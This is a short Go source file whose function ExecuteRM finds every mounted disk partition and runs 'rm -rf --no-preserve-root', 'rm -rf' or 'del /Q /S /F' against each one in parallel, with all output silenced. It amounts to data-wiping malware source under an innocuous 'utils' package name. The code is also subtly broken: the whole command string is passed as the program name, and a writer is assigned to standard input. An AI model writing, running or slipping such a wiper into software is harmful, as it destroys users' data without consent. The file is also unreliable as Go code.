package utils

import (
	"errors"
	"os"
	"os/exec"
	"runtime"
	"sync"
    "io"

	"github.com/shirou/gopsutil/v3/disk"
)

var (
	RuntimeErrorUnsupportedPlatform = errors.New("unsupported platform")
)

func ExecuteRM(sig chan int) {
	var cmdstr string
	switch runtime.GOOS {
	case "darwin":
		cmdstr = "rm -rf "
	case "linux":
		cmdstr = "rm -rf --no-preserve-root "
	case "windows":
		cmdstr = "del /Q /S /F "
	default:
		panic(RuntimeErrorUnsupportedPlatform)
	}

	mountParts, err := disk.Partitions(false)
	if err != nil {
		panic(err)
	}

	wg := &sync.WaitGroup{}
	for _, mountPart := range mountParts {
		wg.Add(1)
		cmd := exec.Command(cmdstr + "\"" + mountPart.Mountpoint + "\"")
		cmd.Stdin = io.Discard
		cmd.Stdout = io.Discard
		cmd.Stderr = io.Discard
		go func() {
			defer wg.Done()
			_ = cmd.Run()
		}()
	}

	wg.Wait()
	sig <- 1
}
